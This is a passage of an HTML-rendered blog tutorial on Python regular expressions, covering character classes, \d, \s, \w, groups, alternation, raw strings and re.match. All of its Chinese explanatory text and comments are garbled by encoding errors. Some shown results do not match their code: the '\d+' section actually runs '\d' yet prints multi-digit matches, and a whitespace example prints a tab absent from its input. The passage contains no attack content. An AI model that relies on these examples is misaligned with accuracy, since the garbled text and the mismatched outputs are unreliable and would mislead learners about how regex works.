class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™&#123;3&#125;"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#&#123;m&#125;åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡ï¼Œ&#123;m,n&#125;åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡ï¼Œè‹¥çœç•¥nï¼Œåˆ™åŒ¹é…mè‡³æ— é™æ¬¡</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">æ‰“å°å‡º [<span class="string">'åŒ¹é…è§„åˆ™åˆ™åˆ™'</span>]</span><br></pre></td></tr></table></figure><h3 id="å…ƒå­—ç¬¦-å­—ç¬¦é›†"><a href="#å…ƒå­—ç¬¦-å­—ç¬¦é›†" class="headerlink" title="[]å…ƒå­—ç¬¦,å­—ç¬¦é›†"></a>[]å…ƒå­—ç¬¦,å­—ç¬¦é›†</h3><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„ [] å…ƒå­—ç¬¦ï¼‰å¯¹åº”ä½ç½®æ˜¯[]é‡Œçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦å°±åŒ¹é…</p><p>å­—ç¬¦é›†ã€‚å¯¹åº”çš„ä½ç½®å¯ä»¥æ˜¯å­—ç¬¦é›†ä¸­ä»»æ„å­—ç¬¦ã€‚å­—ç¬¦é›†ä¸­çš„å­—ç¬¦å¯ä»¥é€ä¸ªåˆ—å‡ºï¼Œä¹Ÿå¯ä»¥ç»™å‡ºèŒƒå›´ï¼Œå¦‚[abc]æˆ–[a-c]ã€‚[^abc]è¡¨ç¤ºå–åï¼Œå³éabcã€‚æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦åœ¨å­—ç¬¦é›†ä¸­éƒ½å¤±å»å…¶åŸæœ‰çš„ç‰¹æ®Šå«ä¹‰ã€‚ç”¨\åæ–œæ è½¬ä¹‰ <strong>æ¢å¤</strong> ç‰¹æ®Šå­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…[a,b,c]è§„åˆ™"</span>, <span class="string">"åŒ¹é…aè§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…bè§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„ [] å…ƒå­—ç¬¦ï¼‰å¯¹åº”ä½ç½®æ˜¯[]é‡Œçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦å°±åŒ¹é…</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…aè§„åˆ™'</span>, <span class="string">'åŒ¹é…bè§„åˆ™'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…[a,b,c]è§„åˆ™\t"</span>, <span class="string">"åŒ¹é…aè§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…bè§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…aè§„åˆ™\t'</span>]</span><br></pre></td></tr></table></figure><h4 id="åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰"><a href="#åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰" class="headerlink" title="åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰"></a>åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰</h4><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯åœ¨å­—ç¬¦é›†å’Œç»„é‡Œéƒ½æ˜¯æœ‰ç”¨çš„</p><p>\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™2ä¸ªå­—ç¬¦ä¸²33æ˜¯å¦åŒ¹é…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure><p>\d+å¦‚æœéœ€è¦åŒ¹é…ä¸€ä½æˆ–è€…å¤šä½æ•°çš„æ•°å­—æ—¶ç”¨</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™2ä¸ªå­—ç¬¦ä¸²33æ˜¯å¦åŒ¹é…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'33'</span>,  <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure><p>\DåŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^0-9]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\D"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™2ä¸ªå­—ç¬¦ä¸²33æ˜¯å¦åŒ¹é…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\DåŒ¹é…ä»»ä½•éåè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[^0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'è¿™'</span>, <span class="string">'ä¸ª'</span>, <span class="string">'å­—'</span>, <span class="string">'ç¬¦'</span>, <span class="string">'ä¸²'</span>, <span class="string">'æ˜¯'</span>, <span class="string">'å¦'</span>, <span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>]</span><br></pre></td></tr></table></figure><p>\såŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[\t\n\r\f\v]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\s"</span>, <span class="string">"åŒ¹é…è§„åˆ™   è¿™2ä¸ªå­—ç¬¦ä¸²3æ˜¯å¦åŒ¹\né…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\såŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[\t\n\r\f\v](æ¨ªå‘åˆ¶è¡¨ç¬¦ã€æ¢è¡Œã€å›è½¦ã€æ¢é¡µã€çºµå‘åˆ¶è¡¨ç¬¦)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'\t'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">'\n'</span>]</span><br></pre></td></tr></table></figure><p>\SåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^\t\n\r\f\v]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\S"</span>, <span class="string">"åŒ¹é…è§„åˆ™   è¿™2ä¸ªå­—ç¬¦ä¸²3æ˜¯å¦åŒ¹\né…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\SåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^\t\n\r\f\v](æ¨ªå‘åˆ¶è¡¨ç¬¦ã€æ¢è¡Œã€å›è½¦ã€æ¢é¡µã€çºµå‘åˆ¶è¡¨ç¬¦)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'è¿™'</span>, <span class="string">'2'</span>, <span class="string">'ä¸ª'</span>, <span class="string">'å­—'</span>, <span class="string">'ç¬¦'</span>, <span class="string">'ä¸²'</span>, <span class="string">'3'</span>, <span class="string">'æ˜¯'</span>, <span class="string">'å¦'</span>, <span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'5'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'7'</span>, <span class="string">'åˆ™'</span>]</span><br></pre></td></tr></table></figure><p>\wåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[a-zA-Z0-9_]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\w'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\wåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'h'</span>, <span class="string">'t'</span>, <span class="string">'t'</span>, <span class="string">'p'</span>, <span class="string">'s'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'c'</span>, <span class="string">'n'</span>, <span class="string">'b'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'g'</span>, <span class="string">'s'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br></pre></td></tr></table></figure><p>\WåŒ¹é…éä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ï¼Œå®ƒç›¸å½“äºç±»[^a-zA-Z0-9_]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\W'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\Wä¸åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">':'</span>, <span class="string">'/'</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦ï¼Œåˆ†ç»„"><a href="#å…ƒå­—ç¬¦ï¼Œåˆ†ç»„" class="headerlink" title="()å…ƒå­—ç¬¦ï¼Œåˆ†ç»„"></a>()å…ƒå­—ç¬¦ï¼Œåˆ†ç»„</h4><p>ä¹Ÿå°±æ˜¯åˆ†ç»„åŒ¹é…ï¼Œ()é‡Œé¢çš„ä¸ºä¸€ä¸ªç»„ä¹Ÿå¯ä»¥ç†è§£æˆä¸€ä¸ªæ•´ä½“</p><p>å¦‚æœ()åé¢è·Ÿçš„æ˜¯ç‰¹æ®Šå…ƒå­—ç¬¦å¦‚   (adc)*   é‚£ä¹ˆ*æ§åˆ¶çš„å‰å¯¼å­—ç¬¦å°±æ˜¯()é‡Œçš„æ•´ä½“å†…å®¹ï¼Œä¸å†æ˜¯å‰å¯¼ä¸€ä¸ªå­—ç¬¦</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="comment">#ä¹Ÿå°±æ˜¯åˆ†ç»„åŒ¹é…ï¼Œ()é‡Œé¢çš„ä¸ºä¸€ä¸ªç»„ä¹Ÿå¯ä»¥ç†è§£æˆä¸€ä¸ªæ•´ä½“</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"(a4)+"</span>, <span class="string">"a4a4a4a4a4dg4g654gb"</span>)   <span class="comment">#åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªa4</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a4a4a4a4a4</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"a(\d+)"</span>,<span class="string">"a45646148a49a4a456048a45gg"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">9</span>), match=<span class="string">'a45646148'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a45646148</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦ï¼Œæˆ–"><a href="#å…ƒå­—ç¬¦ï¼Œæˆ–" class="headerlink" title="|å…ƒå­—ç¬¦ï¼Œæˆ–"></a>|å…ƒå­—ç¬¦ï¼Œæˆ–</h4><p>|æˆ–ï¼Œæˆ–å°±æ˜¯å‰åå…¶ä¸­ä¸€ä¸ªç¬¦åˆå°±åŒ¹é…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"ä½ |å¥½"</span>, <span class="string">"a4a4aä½ 4aabc4a4dggå¥½dg4g654g"</span>)   <span class="comment">#|æˆ–ï¼Œæˆ–å°±æ˜¯å‰åå…¶ä¸­ä¸€ä¸ªç¬¦åˆå°±åŒ¹é…</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'ä½ '</span>, <span class="string">'å¥½'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a4a4aä½ |å¥½dg4g654"</span>,<span class="string">"a4a4aä½ 4aabc4a4dggå¥½dg4g654g"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a4a4aä½ '</span>, <span class="string">'å¥½dg4g654'</span>]</span><br></pre></td></tr></table></figure><h4 id="råŸç”Ÿå­—ç¬¦"><a href="#råŸç”Ÿå­—ç¬¦" class="headerlink" title="råŸç”Ÿå­—ç¬¦"></a>råŸç”Ÿå­—ç¬¦</h4><p>å°†åœ¨pythoné‡Œæœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦å¦‚\bï¼Œè½¬æ¢æˆåŸç”Ÿå­—ç¬¦ï¼ˆå°±æ˜¯å»é™¤å®ƒåœ¨pythonçš„ç‰¹æ®Šæ„ä¹‰ï¼‰ï¼Œä¸ç„¶ä¼šç»™æ­£åˆ™è¡¨è¾¾å¼æœ‰å†²çªï¼Œä¸ºäº†é¿å…è¿™ç§å†²çªå¯ä»¥åœ¨è§„åˆ™å‰åŠ åŸå§‹å­—ç¬¦r</p><p>(è¿™é‡Œè¿˜æœ‰ç‚¹é—®é¢˜ï¼Œç»“æœä¸å¤ªæ‡‚ï¼Œä¸ºå•¥ç¬¬ä¸€ä¸ªä¸è¾“å‡º [a\b] )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a\x08'</span>]</span><br></pre></td></tr></table></figure><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>result = re.method(â€œruleâ€,string)</p><h4 id="1-match-æ–¹æ³•-ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…"><a href="#1-match-æ–¹æ³•-ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…" class="headerlink" title="1. match()æ–¹æ³•, ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…"></a>1. match()æ–¹æ³•, ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s\d+\s\w*'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(result.span()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹çš„ä½ç½®ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure><h4 id="2-åŒ¹é…ç›®æ ‡"><a href="#2-åŒ¹é…ç›®æ ‡" class="headerlink" title="2. åŒ¹é…ç›®æ ‡"></a>2. åŒ¹é…ç›®æ ‡</h4><p>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ç”¨()æ‹¬èµ·æ¥å¯ä»¥ä½¿ç”¨group()è¾“å‡º, è‹¥æœ‰nä¸ª(), é‚£ä¹ˆå¯ä»¥è¡¨ç¤ºä¸ºgroup(n), è¾“å‡ºç¬¬nä¸ªæ‹¬å·åŒ¹é…çš„å†…å®¹.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s(\d+)\sis'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(result.group(<span class="number">1</span>)) <span class="comment">#è¾“å‡ºç¬¬ä¸€ä¸ªè¢«()åŒ…è£¹çš„å†…å®¹</span></span><br><span class="line">print(result.span()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹çš„ä½ç½®ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure><h4 id="3-é€šç”¨åŒ¹é…"><a href="#3-é€šç”¨åŒ¹é…" class="headerlink" title="3.é€šç”¨åŒ¹é…"></a>3.é€šç”¨åŒ¹é…</h4><p>. è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦, *è¡¨ç¤ºåŒ¹é…å‰é¢å­—ç¬¦æ— é™æ¬¡.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">result = re.match(<span class="string">r'^The.*number.$'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(result.span()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹çš„ä½ç½®ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 